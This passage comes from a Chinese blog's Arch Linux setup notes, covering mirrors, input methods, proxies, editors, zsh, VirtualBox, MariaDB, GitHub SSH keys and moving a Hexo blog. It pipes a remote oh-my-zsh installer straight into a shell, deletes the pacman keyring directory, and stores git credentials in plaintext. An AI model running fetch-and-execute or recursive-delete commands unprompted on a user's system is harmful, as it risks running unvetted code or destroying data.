<h2 id="软件仓库镜像"><a href="#软件仓库镜像" class="headerlink" title="软件仓库镜像"></a>软件仓库镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/pacman.d/mirrorlist</span><br><span class="line">	Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirrors.ustc.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirrors.aliyun.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirrors.163.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirrors.hust.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://run.hit.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://ftp.kaist.ac.kr/ArchLinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirrors.hustunique.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://ftp.jaist.ac.jp/pub/Linux/ArchLinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirror.premi.st/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirror.its.dal.ca/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirror.de.leaseweb.net/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    Server = http://mirror.clibre.uqam.ca/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line">    </span><br><span class="line">nano /etc/pacman.conf</span><br><span class="line">	[multilib]</span><br><span class="line">	Include = /etc/pacman.d/mirrorlist</span><br><span class="line">	</span><br><span class="line">	[archlinuxcn]</span><br><span class="line">    Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">    </span><br><span class="line">   	或者：</span><br><span class="line">   	</span><br><span class="line">   	[archlinuxcn]</span><br><span class="line">    Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line">安装 archlinuxcn-keyring 导入 GPG key</span><br><span class="line">sudo pacman -S archlinuxcn-keyring 直接这样会出错</span><br><span class="line">sudo pacman -Syu haveged</span><br><span class="line">sudo systemctl start haveged</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> haveged</span><br><span class="line"></span><br><span class="line">sudo rm -fr /etc/pacman.d/gnupg</span><br><span class="line">sudo pacman-key --init</span><br><span class="line">sudo pacman-key --populate archlinux</span><br><span class="line">sudo pacman-key --populate archlinuxcn</span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br><span class="line">sudo pacman -Syu</span><br></pre></td></tr></table></figure>

<p> 解决：</p>
<blockquote>
<p><em>错误：无法提交处理 (无效或已损坏的软件包 (PGP 签名))</em></p>
</blockquote>
<p>此处参考：</p>
<ul>
<li><a href="https://www.archlinuxcn.org/gnupg-2-1-and-the-pacman-keyring/" target="_blank" rel="noopener">GnuPG-2.1 与 pacman 密钥环</a></li>
<li><a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/" target="_blank" rel="noopener">Arch Linux 中文社区仓库 / 镜像加速源</a><h2 id="安装字体-中文"><a href="#安装字体-中文" class="headerlink" title="安装字体(中文)"></a>安装字体(中文)</h2></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo pacman -S adobe-source-han-sans-cn-fonts (思源黑体)</span><br><span class="line">2. sudo pacman -S ttf-dejavu</span><br><span class="line">3. sudo pacman -S wqy-zenhei</span><br><span class="line">4. sudo pacman -S wqy-microhei</span><br><span class="line"></span><br><span class="line">nano /etc/locale.conf</span><br><span class="line">    LANG=zh_CN.UTF-8</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>推荐安装 FireCode 自体 <a href="https://github.com/tonsky/FiraCode" target="_blank" rel="noopener">https://github.com/tonsky/FiraCode</a></p>
<h2 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h2><p>目前 <strong>fcitx-im</strong> 取消了 <strong>fcitx-qt4</strong> : <a href="https://www.archlinux.org/groups/x86_64/fcitx-im/" target="_blank" rel="noopener">https://www.archlinux.org/groups/x86_64/fcitx-im/</a> 导致搜狗输入法无法在archlinux上正常使用 ，而网上大多数的方法无法在archlinux下使用。正确姿势应该是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S  fcitx-lilydjwg-git fcitx-qt5 fcitx-configtool</span><br><span class="line">nano ~/.xprofile</span><br><span class="line">	export GTK_IM_MODULE=fcitx</span><br><span class="line">	export QT_IM_MODULE=fcitx</span><br><span class="line">	export XMODIFIERS="@im=fcitx"</span><br><span class="line"></span><br><span class="line">sudo pacman -S fcitx-sogoupinyin</span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo pacman -S fcitx-googlepinyin</span></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>PS: 目前 <code>fcitx-lilydjwg-git</code> 已经包含了 <code>fcitx-qt4</code>  这个包</p>
<p>如果已经安装了搜狗输入法了，那么只需安装 <strong>fcitx-qt4</strong> 这个包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay fcitx-qt4</span><br></pre></td></tr></table></figure>

<p>注销重新登录<br>亲测在archlinux和manjaro成功！</p>
<h2 id="安装Icon主题-可选"><a href="#安装Icon主题-可选" class="headerlink" title="安装Icon主题(可选)"></a>安装Icon主题(可选)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S numix-circle-icon-theme-git</span><br></pre></td></tr></table></figure>

<h2 id="pacman彩色输出"><a href="#pacman彩色输出" class="headerlink" title="pacman彩色输出"></a>pacman彩色输出</h2><p>编辑 <code>/etc/pacman.conf</code>，取消 <code>Color</code> 注释</p>
<h2 id="Nano-支持代码高亮"><a href="#Nano-支持代码高亮" class="headerlink" title="Nano 支持代码高亮"></a>Nano 支持代码高亮</h2><p>nano是linux下轻量级的文本编辑器，也是大多数linux发行版都默认安装的。但默认安装archlinux后 nano对于特殊文本的代码高亮支持并没有开启，因此要想让代码高亮显示，就要手动开启该功能。</p>
<p>首先nano所支持的一些代码格式文件存放在  <strong>/usr/share/nano/</strong> 目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls /usr/share/nano/</span><br><span class="line">asm.nanorc        elisp.nanorc       json.nanorc      objc.nanorc        ruby.nanorc</span><br><span class="line">autoconf.nanorc   fortran.nanorc     lua.nanorc       ocaml.nanorc       rust.nanorc</span><br><span class="line">awk.nanorc        gentoo.nanorc      makefile.nanorc  patch.nanorc       sh.nanorc</span><br><span class="line">changelog.nanorc  go.nanorc          man.nanorc       perl.nanorc        spec.nanorc</span><br><span class="line">cmake.nanorc      groff.nanorc       mgp.nanorc       php.nanorc         tcl.nanorc</span><br><span class="line">c.nanorc          guile.nanorc       mutt.nanorc      po.nanorc          texinfo.nanorc</span><br><span class="line">css.nanorc        html.nanorc        nanohelp.nanorc  postgresql.nanorc  tex.nanorc</span><br><span class="line">debian.nanorc     java.nanorc        nanorc.nanorc    pov.nanorc         xml.nanorc</span><br><span class="line">default.nanorc    javascript.nanorc  nftables.nanorc  python.nanorc</span><br></pre></td></tr></table></figure>

<p>此时，我们可以在当前用户主目录下新建 <strong>.nanorc</strong> 文件，并添加 <code>/usr/share/nano/*.nanorc</code>  表示nano支持 /usr/share/nano 下的所有代码格式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ~/.nanorc </span><br><span class="line">	include /usr/share/nano/*.nanorc</span><br></pre></td></tr></table></figure>

<h2 id="修改yay-aur国内源"><a href="#修改yay-aur国内源" class="headerlink" title="修改yay aur国内源"></a>修改yay aur国内源</h2><p>建议用 <strong>yay</strong> 而不是 <strong>yaourt</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay</span><br><span class="line">nano ~/.config/yay/config.json</span><br><span class="line">	        <span class="string">"aururl"</span>: <span class="string">"https://aur.archlinux.org"</span></span><br><span class="line">			替换为 </span><br><span class="line">			<span class="string">"aururl"</span>: <span class="string">"https://aur.tuna.tsinghua.edu.cn"</span></span><br></pre></td></tr></table></figure>

<p>或者直接：</p>
<p><code>yay --aururl &quot;https://aur.tuna.tsinghua.edu.cn&quot; --save</code></p>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="ProxyChains"><a href="#ProxyChains" class="headerlink" title="ProxyChains"></a>ProxyChains</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S proxychains-ng</span><br><span class="line">nano /etc/proxychains.conf</span><br><span class="line">	添加 <span class="string">" socks5  127.0.0.1 1080 "</span></span><br></pre></td></tr></table></figure>

<p> 比如 <code>proxychains curl https://ip.cn</code></p>
<h3 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S shadowsocks-qt5</span><br><span class="line">google-chrome-stable --proxy-server="socks5://127.0.0.1:1080" (暂时代理)</span><br></pre></td></tr></table></figure>

<h3 id="Lantern"><a href="#Lantern" class="headerlink" title="Lantern"></a>Lantern</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S lantern-bin</span><br></pre></td></tr></table></figure>

<h3 id="XX-Net-Proxy-SwitchyOmega-Chrome"><a href="#XX-Net-Proxy-SwitchyOmega-Chrome" class="headerlink" title="XX-Net + Proxy SwitchyOmega + Chrome"></a>XX-Net + Proxy SwitchyOmega + Chrome</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S xx-net</span><br><span class="line">或者到 Github clone</span><br><span class="line">	git clone https://github.com/XX-net/XX-Net.git</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<h2 id="音乐-网易云"><a href="#音乐-网易云" class="headerlink" title="音乐(网易云)"></a>音乐(网易云)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yaourt -S netease-cloud-music</span><br></pre></td></tr></table></figure>

<h2 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wps-office,ttf-wps-fonts</span><br><span class="line">libreoffice</span><br><span class="line">永中Office https://www.yozosoft.com/home.htm</span><br></pre></td></tr></table></figure>

<h2 id="解压缩文件"><a href="#解压缩文件" class="headerlink" title="解压缩文件"></a>解压缩文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S file-roller  xarchiver unzip unrar</span><br></pre></td></tr></table></figure>

<h2 id="数据库客户端管理"><a href="#数据库客户端管理" class="headerlink" title="数据库客户端管理"></a>数据库客户端管理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlitebrowser,dbeaver...</span><br></pre></td></tr></table></figure>

<h2 id="重命名网卡为eth0…"><a href="#重命名网卡为eth0…" class="headerlink" title="重命名网卡为eth0…"></a>重命名网卡为eth0…</h2><p>之前: ifconfig</p>
<blockquote>
<p>enp12s0<br>lo<br>wlp3s0b1</p>
</blockquote>
<p>关键是 <code>net.ifnames=0</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ArchLinux</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> /etc/default/grub</span></span><br><span class="line">    GRUB_CMDLINE_LINUX=""</span><br><span class="line">    GRUB_CMDLINE_LINUX_DEFAULT="audit=0 loglevel=3 quiet net.ifnames=0"</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">2. CentOS</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> net.ifnames=0 biosdevname=0</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> /etc/sysconfig/grub &lt;=&gt; /etc/default/grub</span></span><br><span class="line">    GRUB_CMDLINE_LINUX=... net.ifnames=0 biosdevname=0  ...</span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure>



<h2 id="Vim配置-模板"><a href="#Vim配置-模板" class="headerlink" title="Vim配置(模板)"></a>Vim配置(模板)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nocp</span><br><span class="line">set modelines=0</span><br><span class="line">set backspace=2</span><br><span class="line">syntax on </span><br><span class="line">autocmd InsertLeave * se nocul</span><br><span class="line">autocmd InsertEnter * se cul</span><br><span class="line">set smartindent </span><br><span class="line">set autoindent</span><br><span class="line">set confirm </span><br><span class="line">set tabstop=4 </span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4 </span><br><span class="line">set expandtab </span><br><span class="line">set number</span><br><span class="line">set history=50  </span><br><span class="line">set hlsearch</span><br><span class="line">set incsearch</span><br><span class="line">set gdefault</span><br><span class="line">set encoding=utf-8</span><br><span class="line">set fileencodings=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1</span><br><span class="line">set guifont=Menlo:h16:cANSI </span><br><span class="line">set langmenu=zn_CN.UTF-8</span><br><span class="line">set helplang=cn </span><br><span class="line">set ruler </span><br><span class="line">set laststatus=1 </span><br><span class="line">set showcmd </span><br><span class="line">set scrolloff=3</span><br><span class="line">set showmatch </span><br><span class="line">set matchtime=5</span><br><span class="line">set autowrite </span><br><span class="line">set wildmenu  </span><br><span class="line">set linespace=2 </span><br><span class="line">set whichwrap=b,s,&lt;,&gt;,[,] </span><br><span class="line">filetype plugin indent on </span><br><span class="line">set foldenable  </span><br><span class="line">set cursorline </span><br><span class="line">set magic  </span><br><span class="line">set ignorecase</span><br><span class="line">filetype on </span><br><span class="line">set background=dark</span><br><span class="line">set t_Co=256   </span><br><span class="line">set mouse=i </span><br><span class="line">set backspace=indent,eol,start</span><br></pre></td></tr></table></figure>

<h2 id="Zsh"><a href="#Zsh" class="headerlink" title="Zsh"></a>Zsh</h2><p><a href="https://wiki.archlinux.org/index.php/Zsh_(简体中文)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br><a href="https://github.com/robbyrussell/oh-my-zsh/" target="_blank" rel="noopener">https://github.com/robbyrussell/oh-my-zsh/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh</span><br><span class="line">1. sudo pacman -S oh-my-zsh-git</span><br><span class="line">2. sh -c "$(wget -O- https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</span><br><span class="line">3. sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</span><br><span class="line">4. curl -Lo install.sh https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br><span class="line"></span><br><span class="line">sudo chsh -s /bin/zsh </span><br><span class="line">nano .zshrc</span><br><span class="line">    ZSH_THEME="jtriley"</span><br><span class="line">    plugin: zsh-syntax-highlighting</span><br><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting  ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<h2 id="虚拟机Virtualbox"><a href="#虚拟机Virtualbox" class="headerlink" title="虚拟机Virtualbox"></a><a href="https://wiki.archlinux.org/index.php/VirtualBox_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">虚拟机Virtualbox</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S virtualbox virtualbox-host-modules-arch</span><br><span class="line">pacman -S linux-headers linux</span><br></pre></td></tr></table></figure>

<h3 id="加载-VirtualBox-内核模块"><a href="#加载-VirtualBox-内核模块" class="headerlink" title="加载 VirtualBox 内核模块"></a>加载 VirtualBox 内核模块</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">手动加载模块</span><br><span class="line"><span class="meta">#</span><span class="bash"> modprobe -a vboxguest vboxsf vboxvideo</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -&gt; modprobe vboxdrv</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lsmod|grep vb </span></span><br><span class="line">    vboxnetflt             32768  0</span><br><span class="line">    vboxnetadp             28672  0</span><br><span class="line">    vboxpci                28672  0</span><br><span class="line">    vboxdrv               503808  3 vboxpci,vboxnetadp,vboxnetflt</span><br><span class="line"></span><br><span class="line">开机自动加载模块,启用 vboxservice.service 服务</span><br></pre></td></tr></table></figure>

<h3 id="增强功能"><a href="#增强功能" class="headerlink" title="增强功能"></a>增强功能</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. USB使用:</span><br><span class="line">sudo usermod -aG vboxusers whos 或 sudo gpasswd -a whos vboxusers</span><br><span class="line"></span><br><span class="line">2. 增强功能(载入ISO功能包)</span><br><span class="line">sudo pacman -S  virtualbox-guest-iso</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso</span></span><br></pre></td></tr></table></figure>

<p>或者自己去下载 <strong>VBoxGuestAdditions.iso</strong> ，并在使用virtualbox时载入iso</p>
<p><a href="https://download.virtualbox.org/virtualbox/6.0.10/" target="_blank" rel="noopener">https://download.virtualbox.org/virtualbox/6.0.10/</a></p>
<h3 id="下载拓展包"><a href="#下载拓展包" class="headerlink" title="下载拓展包"></a>下载拓展包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://download.virtualbox.org/virtualbox/6.0.10/Oracle_VM_VirtualBox_Extension_Pack-6.0.10.vbox-extpack</span><br></pre></td></tr></table></figure>

<h3 id="手动挂载"><a href="#手动挂载" class="headerlink" title="手动挂载"></a>手动挂载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在virtualbox虚拟机运行：</span><br><span class="line">mount -t vboxsf &lt;共享目录的名字&gt; &lt;客户机系统的挂载点&gt;</span><br><span class="line"></span><br><span class="line">查看 vboxsf 的挂载参数</span><br><span class="line">mount.vboxsf</span><br><span class="line"></span><br><span class="line">假如用户不在 vboxsf 组里，用这个命令可以把挂载点的读写权限授权给他：</span><br><span class="line"><span class="meta">#</span><span class="bash"> mount -t vboxsf -o uid=1000,gid=1000 home /mnt/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> usermod -aG vboxsf guest</span></span><br></pre></td></tr></table></figure>

<h2 id="百度云盘"><a href="#百度云盘" class="headerlink" title="百度云盘"></a>百度云盘</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S baidunetdisk-bin</span><br></pre></td></tr></table></figure>

<h2 id="MariaDB数据库"><a href="#MariaDB数据库" class="headerlink" title="MariaDB数据库"></a>MariaDB数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mariadb mariadb-libs mariadb-clients</span><br></pre></td></tr></table></figure>

<p>安装 <a href="https://www.archlinux.org/packages/?name=mariadb" target="_blank" rel="noopener">mariadb</a> 软件包之后，你必须在启动 <code>mariadb.service</code> <strong>之前</strong>运行下面这条命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br></pre></td></tr></table></figure>

<p>用下面这个命令启动数据库级别的安全配置助手，来配置一些必要的<strong>安全选项</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>

<p>关于Mariadb10.4身份验证发生的一些变化及其配置，可参考：</p>
<p><a href="https://mariadb.org/authentication-in-mariadb-10-4/" target="_blank" rel="noopener">Authentication in MariaDB 10.4 — Understanding the Changes</a><br>或者<br><a href="https://mariadb.com/kb/en/library/set-password/" target="_blank" rel="noopener">SET PASSWORD</a></p>
<p>修改 root 密码（身份验证表在 *<em>mysql.global_priv *</em>可以 <code>select *from  mysql.global_priv;</code> 查看）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set password for &apos;root&apos;@&apos;%&apos; =password(&apos;xxxxxxxxx&apos;)</span><br></pre></td></tr></table></figure>

<p>如果试图这样做</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE mysql.user SET Password=PASSWORD(&apos;xxxx&apos;) WHERE User=&apos;root&apos;;</span><br></pre></td></tr></table></figure>

<p>那么得到的错误是<br><font color="red">ERROR 1348 (HY000): Column ‘Password’ is not updatable</font></p>
<h2 id="Qt5"><a href="#Qt5" class="headerlink" title="Qt5"></a>Qt5</h2><p>Wiki : <a href="https://wiki.archlinux.org/index.php/Qt_(简体中文)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Qt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S qt5-base qt5-doc qtcreator</span><br></pre></td></tr></table></figure>

<p>反正也可以从官网下载安装包自行安装，不过速度就。。。</p>
<h2 id="Github-SSH-Key"><a href="#Github-SSH-Key" class="headerlink" title="Github SSH Key"></a>Github SSH Key</h2><p>首先检查本机是否存在 SSH keys </p>
<ul>
<li>id_rsa  </li>
<li>id_rsa.pub</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls ~/.ssh</span><br><span class="line">id_rsa  id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>接着</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"my_email@example.com"</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">"<span class="variable">$(ssh-agent -s)</span>"</span></span><br><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制 <code>id_rsa.pub</code> 内容到：<br>–&gt; <strong><a href="https://github.com/settings/keys" target="_blank" rel="noopener">Settings</a></strong> –&gt; <strong>SSH and GPG keys</strong> –&gt; <strong>New SSH key</strong></p>
<p>测试是否成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">    The authenticity of host <span class="string">'github.com (13.250.177.223)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">    RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.</span></span><br><span class="line"><span class="string">    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">    Warning: Permanently added '</span>github.com,13.250.177.223<span class="string">' (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">    Hi josexy! You'</span>ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>如此如此即ok，否则no</p>
<p>配置Git，比如我的这样子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"josexy"</span></span><br><span class="line">git config --global user.email <span class="string">"josephxrays@163.com"</span></span><br><span class="line">git config --global color.ui <span class="literal">true</span> 	<span class="comment"># 可选</span></span><br><span class="line">git config --global credential.helper store  <span class="comment"># 可选</span></span><br></pre></td></tr></table></figure>

<h2 id="迁移Github-Page-hexo"><a href="#迁移Github-Page-hexo" class="headerlink" title="迁移Github Page hexo"></a>迁移Github Page hexo</h2><p>假如要在另一台电脑上更新修改hexo搭建的博客，那么就要重新部署hexo。然而我们也可以不必如此，只需简单几步即可。</p>
<p>首先到博客根目录查看哪些文件/文件夹需要复制过去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la</span><br><span class="line">总用量 216</span><br><span class="line">drwxr-xr-x   8 josexy josexy   4096  8月  5 08:18 .</span><br><span class="line">drwxr-xr-x   6 josexy josexy   4096  8月  6 13:42 ..</span><br><span class="line">-rw-r--r--   1 josexy josexy   2591  7月 21 00:22 _config.yml</span><br><span class="line">-rw-r--r--   1 josexy josexy    174  8月  5 08:20 db.json</span><br><span class="line">drwxr-xr-x  62 josexy josexy   4096  8月  5 08:19 .deploy_git</span><br><span class="line">-rw-r--r--   1 josexy josexy     65  7月 20 10:24 .gitignore</span><br><span class="line">drwxr-xr-x 345 josexy josexy  20480  7月 20 20:57 node_modules</span><br><span class="line">-rw-r--r--   1 josexy josexy    676  7月 20 20:57 package.json</span><br><span class="line">-rw-r--r--   1 josexy josexy 148885  7月 20 20:57 package-lock.json</span><br><span class="line">drwxr-xr-x  61 josexy josexy   4096  8月  5 08:18 public</span><br><span class="line">drwxr-xr-x   2 josexy josexy   4096  7月 20 10:24 scaffolds</span><br><span class="line">drwxr-xr-x   7 josexy josexy   4096  7月 21 11:56 <span class="built_in">source</span></span><br><span class="line">drwxr-xr-x   4 josexy josexy   4096  7月 20 11:39 themes</span><br></pre></td></tr></table></figure>

<p>以下表格列出需要和不需要复制到其他主机的文件/文件夹</p>
<table>
<thead>
<tr>
<th>需要</th>
<th>不需要</th>
</tr>
</thead>
<tbody><tr>
<td>themes</td>
<td>themes/.git</td>
</tr>
<tr>
<td>source</td>
<td>public</td>
</tr>
<tr>
<td>_config.yml</td>
<td>db.json</td>
</tr>
<tr>
<td>.gitignore</td>
<td>.deploy_git</td>
</tr>
<tr>
<td>package.json</td>
<td>package-lock.json</td>
</tr>
<tr>
<td>scaffolds</td>
<td>node_modules</td>
</tr>
</tbody></table>
<p>这样的话，我们就可以把 需要 的文件/文件夹复制过去了，为了能够在另一台主机上使用，还需要安装必要的application</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs</span><br><span class="line">sudo pacman -S npm</span><br><span class="line">sudo pacman -S git</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">sudo npm i hexo-cli -g</span><br></pre></td></tr></table></figure>

<p><font color="red">接着在该目录下执行 <code>npm install</code> 即可安装hexo所需原来的模块，保存在node_modules。 </font><br><strong><em>没有必要 <code>hexo init</code>！没有必要 <code>hexo init</code>！没有必要 <code>hexo init</code>！****</em></strong></p>
<p>若出现类似 </p>
<blockquote>
<p>run <code>npm audit fix</code> to fix them, or <code>npm audit</code> for details </p>
<p>npm WARN <a href="mailto:babel-eslint@10.0.2" target="_blank" rel="noopener">babel-eslint@10.0.2</a> requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer depen<br>dencies yourself.</p>
</blockquote>
<p>按提示操作即可</p>
<p>如果不想每次都要输入github帐号密码，则需要配置 github ssh key ，方法请参见上文。<br>然后 <code>hexo g</code>即可生成 public文件夹，<code>hexo s</code>本地运行，<code>hexo d</code>即可部署github</p>
<p>若出现类似<code>Error: ENOSPC: System limit for number of file watchers reached</code>，解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://wiki.archlinux.org/index.php/Installation_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E5%B7%A5%E4%BD%9C" target="_blank" rel="noopener">参考Archlinux官网Wiki</a></li>
<li><a href="https://www.viseator.com/2017/05/17/arch_install/" target="_blank" rel="noopener">以官方Wiki的方式安装ArchLinux</a></li>
<li><a href="https://blog.fc4soda.moe/posts/arch-linux-config-note/" target="_blank" rel="noopener">arch linux 安装配置笔记</a></li>
<li><a href="https://starrycat.me/archlinux-install-gnome-desktop.html" target="_blank" rel="noopener">ArchLinux安装GNOME图形桌面环境</a></li>
<li><a href="https://github.com/archlinuxcn/mirrorlist-repo" target="_blank" rel="noopener">Arch Linux CN Community repo mirrors list</a></li>
<li><a href="https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Generating a new SSH key and adding it to the ssh-agent</a></li>
<li><a href="https://www.zhihu.com/question/21193762" target="_blank" rel="noopener">使用hexo，如果换了电脑怎么更新博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/74931620" target="_blank" rel="noopener">Arch Linux上安装搜狗输入法</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Parted_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">Parted (简体中文)</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Vsftpd遇到的问题</title>
    <url>/vsftp-configure/</url>
    <content><![CDATA[<p>目前我用的系统是archlinux，所以在配置vsftpd是不是一帆风顺的，这里将安装配置过程记录下来，也无法确保是否还有其他错误。</p>
<a id="more"></a>

<p>安装命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S vsftpd</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>这是我现在的配置（注释已去）</p>
